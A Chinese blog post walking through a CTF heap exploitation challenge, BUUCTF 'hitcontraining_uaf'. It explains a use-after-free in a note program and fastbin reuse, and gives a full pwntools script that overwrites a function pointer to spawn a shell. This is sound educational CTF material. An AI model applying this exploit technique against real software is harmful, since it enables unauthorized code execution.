---
title: "BUUCTF Pwn Hitcontraining_uaf"
date: 2020-04-28T21:35:04+08:00
author: NiceSeven
categories:
  - BUUCTF
tags:
  - Pwn
---

# BUUCTF Pwn Hitcontraining_uaf

考点：

1、UAF（use after free）

2、fastbin bin机制

3、heap的分配规则

![image-20200428215538149](/images/image-20200428215538149.png)

在delete功能中，指针未置NULL造成UAF漏洞

![image-20200428215633925](/images/image-20200428215633925.png)

chunk的数据结构

```c
struct notelist{
	void * printf_note_content;
    char * content;
}
```



|            |                     |  size=0x8  |
| :--------: | :-----------------: | :--------: |
| p_notelist | printf_note_content | p_content  |
|            |                     | size=add() |
| p_content  |       content       |            |

![image-20200428222941667](/images/image-20200428222941667.png)

print_note功能中会执行printf_note_content函数

利用原理：

chunk中存了printf_note_content函数指针，利用fastbin的单链表的机制先add两个fastbin大小的chunk0、chunk1，然后按chunk0、chunk1的顺序来free，这个时候fastbin的链表就是->chunk1->chunk0，再add一个0x8字节大小的chunk2，chunk2实际上前0x8字节分配到的是chunk1的p_notelist指针所指向的heap空间，然后存的p_content指针指向的是chunk0的p_notelist指针所在的heap空间也就说我们在add chunk2的时候内容真正写入位置覆盖了chunk0前8个字节中的printf_note_content指针，因为UAF的缘故，实际上chunk0的p_notelist指针没有释放，我们只需要show(chunk0)，正常情况下是执行printf_note_content函数来输出p_content指针指向的内容，但是printf_note_content指针被覆盖成magic函数的指针了，所以会执行magic函数从而getshell

```python
#-*- coding=UTF-8 -*-
from pwn import *
context.log_level = 'debug'
sh = process('./hacknote')
elf = ELF('./hacknote')
#libc = ELF('./x86_ubuntu16_libc-2.23.so')

def add(size,content):
	sh.sendlineafter('choice :','1')
	sh.sendlineafter('size :',str(size))
	sh.sendlineafter('Content :',content)
def free(idx):
	sh.sendlineafter('choice :','2')
	sh.sendlineafter('Index :',str(idx))
def show(idx):
	sh.sendlineafter('choice :','3')
	sh.sendlineafter('Index :',str(idx))

magic_addr = 0x08048945
add(16,'aaaa')
add(16,'bbbb')
free(0)
free(1)
add(8,p32(magic_addr))#申请8字节才能将chunk2的content指针指向chunk0的前8个字节
show(0)
sh.interactive()
```

![image-20200428223238355](/images/image-20200428223238355.png)